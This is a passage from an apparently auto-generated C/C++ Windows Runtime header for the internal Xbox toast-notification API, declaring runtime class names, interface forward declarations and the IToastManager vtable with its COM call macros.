#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxManager_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxManager_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxManager[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxManager";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxNotification
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotification_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotification_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotification[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxNotification";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.InboxNotificationOptions
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotificationOptions ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 * Class Marshaling Behavior:  Agile - Class is agile
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotificationOptions_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotificationOptions_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_InboxNotificationOptions[] = L"Windows.Xbox.UI.Internal.ToastNotifications.InboxNotificationOptions";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.PickerOption
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IPickerOption ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_PickerOption_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_PickerOption_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_PickerOption[] = L"Windows.Xbox.UI.Internal.ToastNotifications.PickerOption";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.Toast
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToast ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_Toast_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_Toast_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_Toast[] = L"Windows.Xbox.UI.Internal.ToastNotifications.Toast";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastAction
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastAction ** Default Interface **
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow
 *    Windows.Xbox.UI.Internal.ToastNotifications.IVerbQuickRow
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastAction_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastAction_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastAction[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastAction";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastEditInput
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow ** Default Interface **
 *    Windows.Xbox.UI.Internal.ToastNotifications.IEditQuickRow
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastEditInput_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastEditInput_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastEditInput[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastEditInput";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastImage
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastImage ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastImage_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastImage_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastImage[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastImage";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastManager
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * RuntimeClass contains static methods.
 *   Static Methods exist on the Windows.Xbox.UI.Internal.ToastNotifications.IToastManagerInternal interface starting with version 1.0 of the Windows.Xbox.Shell.ToastNotificationsContract API contract
 *   Static Methods exist on the Windows.Xbox.UI.Internal.ToastNotifications.IToastManager interface starting with version 1.0 of the Windows.Xbox.Shell.ToastNotificationsContract API contract
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastManager_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastManager_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastManager[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastManager";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastPickerInput
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow ** Default Interface **
 *    Windows.Xbox.UI.Internal.ToastNotifications.IPickerQuickRow
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastPickerInput_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastPickerInput_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastPickerInput[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastPickerInput";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastPopupModel
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastPopupModel ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastPopupModel_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastPopupModel_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastPopupModel[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastPopupModel";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastStoreGroup
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreGroup ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreGroup_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreGroup_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreGroup[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastStoreGroup";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


/*
 *
 * Class Windows.Xbox.UI.Internal.ToastNotifications.ToastStoreModel
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Class implements the following interfaces:
 *    Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreModel ** Default Interface **
 *
 * Class Threading Model:  Both Single and Multi Threaded Apartment
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreModel_DEFINED
#define RUNTIMECLASS_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreModel_DEFINED
extern const __declspec(selectany) _Null_terminated_ WCHAR RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastStoreModel[] = L"Windows.Xbox.UI.Internal.ToastNotifications.ToastStoreModel";
#endif
#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000






#else // !defined(__cplusplus)
/* Forward Declarations */
#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxActor_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxGameType_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxManager_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotification_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxNotificationOptions_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerOption_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIPickerQuickRow_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToast_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastAction_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastImage_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastInternal_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerInternal_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastQuickRow_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreGroup_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow_FWD_DEFINED__
typedef interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow;

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIVerbQuickRow_FWD_DEFINED__

// Parameterized interface forward declarations (C)

// Collection interface definitions


/*
 *
 * Interface Windows.Xbox.UI.Internal.ToastNotifications.IToastManager
 *
 * Introduced to Windows.Xbox.Shell.ToastNotificationsContract in version 1.0
 *
 *
 * Interface is a part of the implementation of type Windows.Xbox.UI.Internal.ToastNotifications.ToastManager
 *
 *
 */
#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000
#if !defined(____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_INTERFACE_DEFINED__)
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_INTERFACE_DEFINED__
extern const __declspec(selectany) _Null_terminated_ WCHAR InterfaceName_Windows_Xbox_UI_Internal_ToastNotifications_IToastManager[] = L"Windows.Xbox.UI.Internal.ToastNotifications.IToastManager";
/* [object, uuid("944FEE54-68BA-4CBE-8541-08122DBE3A4A"), exclusiveto, contract] */
typedef struct __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerVtbl
{
    BEGIN_INTERFACE
    HRESULT ( STDMETHODCALLTYPE *QueryInterface)(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This,
    /* [in] */ __RPC__in REFIID riid,
    /* [annotation][iid_is][out] */
    _COM_Outptr_  void **ppvObject
    );

ULONG ( STDMETHODCALLTYPE *AddRef )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This
    );

ULONG ( STDMETHODCALLTYPE *Release )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This
    );

HRESULT ( STDMETHODCALLTYPE *GetIids )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This,
    /* [out] */ __RPC__out ULONG *iidCount,
    /* [size_is][size_is][out] */ __RPC__deref_out_ecount_full_opt(*iidCount) IID **iids
    );

HRESULT ( STDMETHODCALLTYPE *GetRuntimeClassName )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This,
    /* [out] */ __RPC__deref_out_opt HSTRING *className
    );

HRESULT ( STDMETHODCALLTYPE *GetTrustLevel )(
    __RPC__in __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This,
    /* [OUT ] */ __RPC__out TrustLevel *trustLevel
    );
HRESULT ( STDMETHODCALLTYPE *GetToastPopupModel )(
        __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This,
        /* [retval, out] */__x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastPopupModel * * value
        );
    HRESULT ( STDMETHODCALLTYPE *GetToastStoreModel )(
        __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This,
        /* [retval, out] */__x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastStoreModel * * value
        );
    HRESULT ( STDMETHODCALLTYPE *FireSystemNotification )(
        __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This,
        /* [in] */HSTRING aumid,
        /* [in] */__x_ABI_CWindows_CData_CXml_CDom_CIXmlDocument* payload,
        /* [in] */UINT32 expirationInS
        );
    HRESULT ( STDMETHODCALLTYPE *FireStandardNotification )(
        __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager * This,
        /* [in] */UINT32 type,
        /* [in] */HSTRING param1,
        /* [in] */HSTRING param2,
        /* [in] */HSTRING param3
        );
    END_INTERFACE
    
} __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerVtbl;

interface __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager
{
    CONST_VTBL struct __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManagerVtbl *lpVtbl;
};

#ifdef COBJMACROS
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_QueryInterface(This,riid,ppvObject) \
( (This)->lpVtbl->QueryInterface(This,riid,ppvObject) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_AddRef(This) \
        ( (This)->lpVtbl->AddRef(This) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_Release(This) \
        ( (This)->lpVtbl->Release(This) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_GetIids(This,iidCount,iids) \
        ( (This)->lpVtbl->GetIids(This,iidCount,iids) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_GetRuntimeClassName(This,className) \
        ( (This)->lpVtbl->GetRuntimeClassName(This,className) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_GetTrustLevel(This,trustLevel) \
        ( (This)->lpVtbl->GetTrustLevel(This,trustLevel) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_GetToastPopupModel(This,value) \
    ( (This)->lpVtbl->GetToastPopupModel(This,value) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_GetToastStoreModel(This,value) \
    ( (This)->lpVtbl->GetToastStoreModel(This,value) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_FireSystemNotification(This,aumid,payload,expirationInS) \
    ( (This)->lpVtbl->FireSystemNotification(This,aumid,payload,expirationInS) )

#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager_FireStandardNotification(This,type,param1,param2,param3) \
